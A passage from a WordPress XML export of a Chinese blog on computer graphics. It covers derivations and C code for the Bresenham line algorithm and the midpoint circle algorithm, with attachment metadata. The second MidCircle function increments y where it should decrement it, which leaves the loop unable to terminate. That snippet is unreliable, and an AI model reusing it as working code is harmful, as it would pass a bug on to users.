width='124'";s:5:"sizes";a:2:{s:9:"thumbnail";a:3:{s:5:"width";s:2:"88";s:6:"height";s:2:"88";s:3:"url";s:73:"http://files.blogcn.com/wp06/M00/01/98/wKgKDU66MjMAAAAAAAAMBGx8gQg262.jpg";}s:6:"medium";a:3:{s:5:"width";s:3:"188";s:6:"height";s:3:"144";s:3:"url";s:73:"http://files.blogcn.com/wp01/M00/03/61/wKgKC066MjMAAAAAAAAZCje4UHc164.jpg";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}s:3:"url";s:73:"http://files.blogcn.com/wp06/M00/04/11/wKgKDE66MjMAAAAAAAAwuksEuQE767.jpg";}]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>BresenhamDDA</title>
		<link>http://codemylife.blogcn.com/2011/11/%e7%9b%b4%e7%ba%bfbresenham%e7%ae%97%e6%b3%95/bresenhamdda/</link>
		<pubDate>Wed, 09 Nov 2011 12:56:19 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://files.blogcn.com/wp02/M00/03/0A/wKgKCk66eHMAAAAAAATZvljhmOE810.bmp</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>148</wp:post_id>
		<wp:post_date>2011-11-09 20:56:19</wp:post_date>
		<wp:post_date_gmt>2011-11-09 12:56:19</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>bresenhamdda</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>145</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
				<wp:attachment_url>http://files.blogcn.com/wp02/M00/03/0A/wKgKCk66eHMAAAAAAATZvljhmOE810.bmp</wp:attachment_url>
								<wp:postmeta>
		<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
		<wp:meta_value><![CDATA[a:0:{}]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>直线Bresenham算法</title>
		<link>http://codemylife.blogcn.com/2011/11/%e7%9b%b4%e7%ba%bfbresenham%e7%ae%97%e6%b3%95/</link>
		<pubDate>Wed, 09 Nov 2011 13:02:59 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category domain="tag"><![CDATA[图形学]]></category>

		<category domain="tag" nicename="%e5%9b%be%e5%bd%a2%e5%ad%a6"><![CDATA[图形学]]></category>

		<category><![CDATA[计算机图形学导论]]></category>

		<category domain="category" nicename="%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%9b%be%e5%bd%a2%e5%ad%a6%e5%af%bc%e8%ae%ba"><![CDATA[计算机图形学导论]]></category>

		<category><![CDATA[读书]]></category>

		<category domain="category" nicename="%e8%af%bb%e4%b9%a6"><![CDATA[读书]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=145</guid>
		<description></description>
		<content:encoded><![CDATA[一艺之成，当尽毕生之力。

之前的 <a href="http://codemylife.blogcn.com/2011/11/%E7%9B%B4%E7%BA%BFdda%E7%AE%97%E6%B3%95/">直线DDA算法</a> 的缺点在于，对y值取整需要时间，而且斜率是一个小数，y 和 k 须是实数或者二进制小数。另外，实数的精度有限，且不精确的 k 重复叠加会产生累积误差。当然，我在实现中由于采取了直接计算该点在 video buffer 中的位置，所以每次描点都有一次乘法运算，可以通过采取相对计算来消除乘法。

Bresenham 算法思想：

假设我们已经选着像素p，那么下一步要选择的像素可能是右边的 E 像素，也可能是右上的 NE 像素，设 Q 为直线与栅格线的交点，那么我们可以计算 E 和 NE 到 Q 的垂直距离，选择离 Q 近的点。

对 Bresenham 算法的描述主要是对其误差判别式的推导，不同的资料有不同推导形式：

<strong>《计算机图形学导论》上的推导过程如下</strong>：<img class="alignright" style="float: right;" src="http://files.blogcn.com/wp05/M00/02/D3/wKgKDE66MjMAAAAAAAAwuh3C90w885.jpg" alt="" />

设直线方程 F(x, y) = ax + by + c = 0，dy = y<sub>1 </sub>- y<sub>0，</sub>dx = x<sub>1 </sub>- x<sub>0，</sub>则其斜截式可以写成：y = dy / dx × x + B，因此：F(x, y) = dy • x+ dx • y + B • dx= 0，其中<strong> a = dy，b = -dx，c = B • dx</strong>。

容易证明，对于线上面的点，F(x, y) 等于 0；对于线下方的点， F(x, y)是正数；对于线上方的点，F(x, y)是负数。运用中点法则，我们只需要计算F(M) = F(x<sub>p</sub>+1, y<sub>p</sub>+1/2)，并考察它是正数还是负数。

定义判定变量 d = F(x<sub>p</sub>+1, y<sub>p</sub>+1/2)。那么d = a (x<sub>p </sub>+ 1) + b( y<sub>p</sub>+1/2 ) + c。对于d &gt;0 和 d &lt; 0，分别选择 NE 和 E。d = 0时，两者都可选，约定选择 E 。

当栅格线移动到下一条时，如果我们选择 E ，M点就在x方向递增一步，那么：d<sub>new</sub> = F(x<sub>p</sub>+2, y<sub>p</sub>+1/2) = a (x<sub>p </sub>+ 2) + b( y<sub>p</sub>+1/2 ) + c，又因为 d<sub>old</sub> = a (x<sub>p </sub>+ 1) + b( y<sub>p</sub>+1/2 ) + c，从而 d<sub>new </sub>= d<sub>old</sub> + a。

将选择 E 后的增量称为<strong> ΔE = a = dy</strong>。 同理可推，选择 NE 后 <strong>ΔNE = a + b = dy - dx</strong>。

基于上面的讨论，增量的中点技术可以概括为：<strong>在每一步，我们可根据上一步所得的判定变量值的符号去选择下一个像素；然后根据所选像素，用ΔE 或ΔNE 去递增判定变量的值。</strong>

计算判定变量的初始值：第一个像素就是第一个端点，那么第一个中点坐标是(x<sub>0</sub>+1, y<sub>0</sub>+1/2)，因此：F(x<sub>0</sub>+1, y<sub>0</sub>+1/2) = a (x<sub>0</sub><sub> </sub>+ 1) + b( y<sub>0</sub>+1/2 ) + c = F(x<sub>0</sub>, y<sub>0</sub>) + a + b/2。由于(x<sub>0</sub>, y<sub>0</sub>)是线上的点，所以F(x<sub>0</sub>, y<sub>0</sub>) = 0。因此：d<sub>start</sub> = a + b/2 = d<sub>y</sub> - d<sub>x</sub>/2。我们对其两边乘2，新的初始值 <strong>d<sub>start </sub>= 2dy - dx</strong>，且不影响中点检测效果，因为未改变 d<sub>start </sub>的符号。

《计算机图形学导论》所给出的 Bresenham 算法描述 和 《Windows 游戏编程大师技巧》中所给出的Bresenham算法描述，是等价的。只不过后者扩充到了其他象限。

上海交大图形学网的 <a href="http://cg.sjtu.edu.cn/lecture_site/chap2/mainframe212.htm#1">Bresenham算法</a> 用图形化的方式形象表现了改算法，对初始值的设定：初值Error =∆y/∆x-0.5，可以通过图像观察得出来的，我在这里纠结了好一会。

伪代码描述：
[c]
//Bresenham's integer line resterization algorithm for the first octal.
//The line end points are (xs,ys) and (xe,ye) assumed not equal.
//All variables are assumed integer.
//initialize variables
x=xs
y=ys
∆x = xe -xs
∆y = ye -ys
//initialize e to compensate for a nonzero intercept
NError =2*∆y-∆x                 //Error =∆y/∆x-0.5
//begin the main loop
for i=1 to ∆x
    WritePixel (x, y)
    if (NError &gt;=0) then
        y=y+1
        NError = NError –2*∆x  //Error = Error -1
    end if
    x=x+1
    NError = NError +2*∆y       //Error = Error +∆y/∆x
next i
finish 
[/c]
这里的 Error = Error -1 同样可以根据图像得出。

如果说《计算图形学导论》对 Bresenham 算法描述是根据选择的方向的不一样，得出下一个光删点与前一个光栅点的判定变量的增量，上海交大图形学网则是根据图形的方式得出其 Error 值，那么下面一个版本的描述则是根据 QE 与 QNE 距离差来推导的，见：<a href="http://jpkc.lit.edu.cn/09/jsjtxx/zxjx/2-1-2-a.htm#">算法描述一</a>。

我推导了一下，虽然比上两个算法描述麻烦点，却也得出了同样的判别式。

下面是用Bresenham算法  和 DDA算法画的一个圆（左半圆 DDA，右半圆 Bresenham）。
<img src="http://files.blogcn.com/wp02/M00/03/0A/wKgKCk66eHMAAAAAAATZvljhmOE810.bmp" alt="" />

代码见：<a href="http://testsuit.blogcn.com/2011/11/bresenham%E7%AE%97%E6%B3%95demo/">Bresenham算法</a>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>145</wp:post_id>
		<wp:post_date>2011-11-09 21:02:59</wp:post_date>
		<wp:post_date_gmt>2011-11-09 13:02:59</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>%e7%9b%b4%e7%ba%bfbresenham%e7%ae%97%e6%b3%95</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[38]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1343358937]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_wp_old_slug</wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>circle对称</title>
		<link>http://codemylife.blogcn.com/2011/11/%e4%b8%ad%e7%82%b9%e5%9c%86%e7%ae%97%e6%b3%95/circle%e5%af%b9%e7%a7%b0/</link>
		<pubDate>Fri, 11 Nov 2011 02:53:56 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://files.blogcn.com/wp04/M00/02/D9/wKgKDE68jkQAAAAAAAAwGE_GTF4443.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>150</wp:post_id>
		<wp:post_date>2011-11-11 10:53:56</wp:post_date>
		<wp:post_date_gmt>2011-11-11 02:53:56</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>circle%e5%af%b9%e7%a7%b0</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>149</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
				<wp:attachment_url>http://files.blogcn.com/wp04/M00/02/D9/wKgKDE68jkQAAAAAAAAwGE_GTF4443.jpg</wp:attachment_url>
								<wp:postmeta>
		<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
		<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"239";s:6:"height";s:3:"211";s:14:"hwstring_small";s:23:"height='96' width='108'";s:5:"sizes";a:2:{s:9:"thumbnail";a:3:{s:5:"width";s:2:"88";s:6:"height";s:2:"88";s:3:"url";s:73:"http://files.blogcn.com/wp05/M00/02/DA/wKgKDU68jkQAAAAAAAAQhHBoR7g752.jpg";}s:6:"medium";a:3:{s:5:"width";s:3:"188";s:6:"height";s:3:"165";s:3:"url";s:73:"http://files.blogcn.com/wp05/M00/02/DB/wKgKDE68jkQAAAAAAAAqnUFR7fw688.jpg";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}s:3:"url";s:73:"http://files.blogcn.com/wp04/M00/02/D9/wKgKDE68jkQAAAAAAAAwGD771Vg477.jpg";}]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>midcircle</title>
		<link>http://codemylife.blogcn.com/2011/11/%e4%b8%ad%e7%82%b9%e5%9c%86%e7%ae%97%e6%b3%95/midcircle/</link>
		<pubDate>Fri, 11 Nov 2011 04:28:42 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://files.blogcn.com/wp06/M00/04/1D/wKgKDE68pHoAAAAAAACoGCqyDfA300.png</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>151</wp:post_id>
		<wp:post_date>2011-11-11 12:28:42</wp:post_date>
		<wp:post_date_gmt>2011-11-11 04:28:42</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>midcircle</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>149</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
				<wp:attachment_url>http://files.blogcn.com/wp06/M00/04/1D/wKgKDE68pHoAAAAAAACoGCqyDfA300.png</wp:attachment_url>
								<wp:postmeta>
		<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
		<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"217";s:6:"height";s:3:"163";s:14:"hwstring_small";s:23:"height='96' width='128'";s:5:"sizes";a:2:{s:9:"thumbnail";a:3:{s:5:"width";s:2:"88";s:6:"height";s:2:"88";s:3:"url";s:73:"http://files.blogcn.com/wp01/M00/02/4B/wKgKCk68pHoAAAAAAAA22luHL-8478.png";}s:6:"medium";a:3:{s:5:"width";s:3:"188";s:6:"height";s:3:"141";s:3:"url";s:73:"http://files.blogcn.com/wp06/M00/04/1D/wKgKDE68pHoAAAAAAACW6ipX0Bc514.png";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}s:3:"url";s:73:"http://files.blogcn.com/wp05/M00/02/DA/wKgKDU68pHoAAAAAAACoGEA3REg936.png";}]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>中点圆算法</title>
		<link>http://codemylife.blogcn.com/2011/11/%e4%b8%ad%e7%82%b9%e5%9c%86%e7%ae%97%e6%b3%95/</link>
		<pubDate>Sat, 12 Nov 2011 04:13:40 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category domain="tag"><![CDATA[图形学]]></category>

		<category domain="tag" nicename="%e5%9b%be%e5%bd%a2%e5%ad%a6"><![CDATA[图形学]]></category>

		<category><![CDATA[计算机图形学导论]]></category>

		<category domain="category" nicename="%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%9b%be%e5%bd%a2%e5%ad%a6%e5%af%bc%e8%ae%ba"><![CDATA[计算机图形学导论]]></category>

		<category><![CDATA[读书]]></category>

		<category domain="category" nicename="%e8%af%bb%e4%b9%a6"><![CDATA[读书]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=149</guid>
		<description></description>
		<content:encoded><![CDATA[孤单是一个人的狂欢，狂欢是一群人的孤单。

圆的八方向对称性，使得我们只需要计算0 - 45度之间的一段圆弧，就能得到整个圆。<img class="alignright" style="float: right;" src="http://files.blogcn.com/wp04/M00/02/D9/wKgKDE68jkQAAAAAAAAwGE_GTF4443.jpg" alt="" width="239" height="211" />

<strong>基础算法</strong>

<strong> </strong>根据圆的方程：x<sup>2 </sup>+ y<sup>2</sup> = R<sup>2</sup>。可表示为：y = 正负根号下 (R<sup>2 </sup>- x<sup>2</sup>)。我们可以将 x 一个单位一个单位地从 0 递增到 R ，并求出每一步的 +y 值，但是当 x 靠近 R 时，圆会有很大间隔。另一种效率差不多的算法，是将 θ 从 0 增长到 90，并画出点 (Rcosθ, Rsinθ)，可以避免出现较大的间隔，但效率差不多。

<strong>中点圆算法</strong>

考虑角度为45度的一段圆弧，即从x = 0 到 x = y = R / √2 。与中点算法类似，这里所给出的方法是在 2 个像素的中点处给一个评估函数值，并据此在 2 个像素之间选择更靠近圆的那个像素。<img class="alignright" style="float: right;" src="http://files.blogcn.com/wp06/M00/04/1D/wKgKDE68pHoAAAAAAACoGCqyDfA300.png" alt="" width="217" height="163" />

设函数F(x, y) = x<sup>2 </sup>+ y<sup>2 </sup>- R<sup>2</sup>。对圆上的点，此函数值是0；对于圆内的点，函数值是正的；对于圆外的点，函数值是负的。

和画线类似，我们选择像素是根据判定变量 d 的值，即函数F(x, y)在中点处的值：d<sub>old </sub>= F(x<sub>p</sub>+1, y<sub>p</sub> - 1/2) = (x<span><sub>p </sub>+ 1</span>)<sup>2 </sup>+ (y<sub>p </sub>- 1/2)<sup>2</sup> - R<sup>2</sup>。如果 d<sub>old </sub>&lt; 0，就选择像素 P1，并将当前中点d的x坐标增加一个单位，以得到下一个中点：d<sub>new </sub>= F(x<sub>p</sub>+2, y<sub>p</sub> - 1/2) = (x<sub>p </sub>+ 2)<sup>2 </sup>+ (y<sub>p </sub>- 1/2)<sup>2</sup> - R<sup>2</sup>。

d<sub>new</sub> = d<sub>old</sub> + (2 x<sub>p</sub> + 3)，因此<strong>ΔP1 = 2 x<sub>p</sub> + 3</strong>。同理可推导出<strong>ΔP2 = 2 x<sub>p </sub>- 2y<sub>p</sub> + 5</strong>。

计算初始值：限定该算法处理的圆半径是整数，并只画第二个八分圆弧，因此，圆的像素起始像素点是(0, R)，下一个中点位置是 (1, R - 1/2)，因此F(1, R - 1/2)  = 1 + (R<sup>2</sup> - R + 1/4) - R<sup>2</sup> = 5/4 - R。于是判定变量 <strong>d = 5/4 - R</strong>，那么  d &lt; 0时选择 P1，否则选择P2。为了避免小数的出现，定义新的判定变量 h = d - 1/4，这样d &lt; 0 变成了比较 h &lt; -1/4。由于 h 是一个整数，增量（ΔP1 和 ΔP2）也是整数，所以可将比较改为h &lt; 0，于是得到整数型算法：

[c]
void MidCircle(int r, int color)
{
    int x, y, d;
    x = 0;
    y = r;
    d = 1 - r;
    CirclePoints(x, y, color);
    while (y &gt; x) {
        if (d &lt; 0) {
            d += x * 2 + 3;
            x++;
        }
        else {
            d += (x - y) * 2;
            x++;
            y--;
        }
        CirclePoints(x, y, color);
    }
}
[/c]

二阶差分
Δ函数是线性方程，可以直接计算，然而任意一个多项式都可以按增量的方式计算，如同我们处理线和圆的判定变量一样，事实上我们是在计算<strong>一阶</strong>和<strong>二阶</strong>的<strong>偏差分</strong>，其基本思想是计算函数在其两个临近点的值，以及这两个值的差分值（对于多项式而言，常常是一个低次多项式的值），并且在程序的每一次迭代中运用这个差分值。

题外话：小时候，我做个这种事情，就是将一列数（比如 x<sup>2</sup>）进行相减，计算出了差值序列，看有无什么规律，没规律再将得到的差值序列再相减……，那个时候幻想自己发现什么定律，成为数学家，后来才知道这叫差分。

在前面的迭代中，我们选择p1，那么估值点从 (x<sub>p</sub>, y<sub>p</sub>)  变化到 (x<sub>p</sub> + 1, y<sub>p</sub>)，显然在点 (x<sub>p</sub>, y<sub>p</sub>) 处的一阶差分ΔP<sub>1old </sub>= 2x<sub>p</sub> + 3，因此点 (x<sub>p+1</sub>, y<sub>p</sub>) 处的一阶差分ΔP<sub>1new </sub>= 2(x<sub>p</sub> + 1) + 3，因此其二阶差分是ΔP<sub>1new </sub> - ΔP<sub>1old </sub> = 2。类似地，在点(x<sub>p</sub>, y<sub>p</sub>)处的ΔP<sub>2old</sub> = 2x<sub>p</sub> - 2y<sub>p</sub> + 5。在点 (x<sub>p+1</sub>, y<sub>p</sub>)处的ΔP<sub>2new</sub> = 2x(<sub>p</sub> + 1) - 2y<sub>p</sub> + 5，从而二阶差分ΔP<sub>2new </sub> - ΔP<sub>2old </sub> = 2。

同理可计算选择p2后，估值点从 (x<sub>p</sub>, y<sub>p</sub>) 变化到 (x<sub>p</sub> + 1, y<sub>p</sub> - 1)，因此在点(x<sub>p</sub> + 1, y<sub>p</sub> - 1) 处ΔP<sub>1new </sub> = 2x(<sub>p</sub> + 1)  + 3，而二阶差分是ΔP<sub>1new </sub> - ΔP<sub>1old </sub> = 2。类似地，在点(x<sub>p</sub> + 1, y<sub>p</sub> - 1)处的ΔP<sub>2new</sub> = 2(x<sub>p</sub> + 1) - 2(y<sub>p</sub> - 1) + 5 ，相应的二阶差分是ΔP<sub>2new </sub> - ΔP<sub>2old </sub> = 4。

这里可能会有这样的疑问，为什么选择了p1后，我们还需要计算ΔP<sub>2new</sub> ，进而计算其二阶差分ΔP<sub>2new </sub> - ΔP<sub>2old </sub> 。类似的，为什么选择p2后，还需要计算ΔP<sub>1new </sub> - ΔP<sub>1old </sub>？

可以这样理解，对比圆的整数中点算法，可知，每次 d 都会加上一个线性函数（ΔP1 或 ΔP2），当我们采用二阶差分算法时，d 的增量，是加上这个线性函数在邻近两点的差值（相当于间接计算了线性函数），这样我们必须在选择了p1后，还需要计算ΔP<sub>2new</sub> ，是为了以后若选p2这样的圆内点的时候，其线性函数的值是正确的！

[c title="以deltaE、deltaSE 代表 P1、P2处的二阶差分"]
void MidCircle(int r, int color)
{
    int x, y, d, deltaE, deltaSE;
    x = 0;
    y = r;
    d = 1 - r;
    deltaE = 3; // 2 * xp + 3 = 3
    deltaSE = 5 - 2 * r; // 2 * xp - 2 * yp + 5 = 5 - 2r
    CirclePoints(x, y, color);
    while (y &gt; x) {
        if (d &lt; 0) {
            d += deltaE;
            deltaE += 2;
            deltaSE += 2;
            x++;
        }
        else {
            d += deltaSE;
            deltaE += 2;
            deltaSE += 4;
            x++;
            y++;
        }
        CirclePoints(x, y, color);
    }
}
[/c]
画圆效果图：见<a href="http://testsuit.blogcn.com/2011/11/%E4%B8%AD%E7%82%B9%E5%9C%86%E7%AE%97%E6%B3%95demo/">中点圆算法Demo</a>
<img src="http://files.blogcn.com/wp02/M00/02/A0/wKgKC06_LQAAAAAAAARAwgkE7rw940.bmp" alt="" />]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>149</wp:post_id>
		<wp:post_date>2011-11-12 12:13:40</wp:post_date>
		<wp:post_date_gmt>2011-11-12 04:13:40</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>%e4%b8%ad%e7%82%b9%e5%9c%86%e7%ae%97%e6%b3%95</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[31]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1343358930]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>midcircleDemo</title>
		<link>http://codemylife.blogcn.com/2011/11/%e4%b8%ad%e7%82%b9%e5%9c%86%e7%ae%97%e6%b3%95/midcircledemo/</link>
		<pubDate>Sun, 13 Nov 2011 02:35:44 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://files.blogcn.com/wp02/M00/02/A0/wKgKC06_LQAAAAAAAARAwgkE7rw940.bmp</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>153</wp:post_id>
		<wp:post_date>2011-11-13 10:35:44</wp:post_date>
		<wp:post_date_gmt>2011-11-13 02:35:44</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>midcircledemo</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>149</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
				<wp:attachment_url>http://files.blogcn.com/wp02/M00/02/A0/wKgKC06_LQAAAAAAAARAwgkE7rw940.bmp</wp:attachment_url>
								<wp:postmeta>
		<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
		<wp:meta_value><![CDATA[a:0:{}]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>Cohen-Sutherland</title>
		<link>http://codemylife.blogcn.com/2011/11/cohen-sutherland-%e7%ba%bf%e8%a3%81%e5%89%aa%e7%ae%97%e6%b3%95/cohen-sutherland/</link>
		<pubDate>Sun, 27 Nov 2011 11:29:12 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://files.blogcn.com/wp04/M00/03/23/wKgKDE7SHwgAAAAAAAARWRnmyRg657.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>156</wp:post_id>
		<wp:post_date>2011-11-27 19:29:12</wp:post_date>
		<wp:post_date_gmt>2011-11-27 11:29:12</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>cohen-sutherland</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>155</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
				<wp:attachment_url>http://files.blogcn.com/wp04/M00/03/23/wKgKDE7SHwgAAAAAAAARWRnmyRg657.jpg</wp:attachment_url>
								<wp:postmeta>
		<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
		<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"284";s:6:"height";s:3:"178";s:14:"hwstring_small";s:23:"height='80' width='128'";s:5:"sizes";a:2:{s:9:"thumbnail";a:3:{s:5:"width";s:2:"88";s:6:"height";s:2:"88";s:3:"url";s:73:"http://files.blogcn.com/wp05/M00/03/23/wKgKDU7SHwgAAAAAAAAJfGdosFk637.jpg";}s:6:"medium";a:3:{s:5:"width";s:3:"188";s:6:"height";s:3:"117";s:3:"url";s:73:"http://files.blogcn.com/wp05/M00/03/23/wKgKDU7SHwgAAAAAAAASOjE1ACE512.jpg";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}s:3:"url";s:73:"http://files.blogcn.com/wp04/M00/03/23/wKgKDE7SHwgAAAAAAAARWVBd018642.jpg";}]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>Cohen-Sutherland_eg1</title>
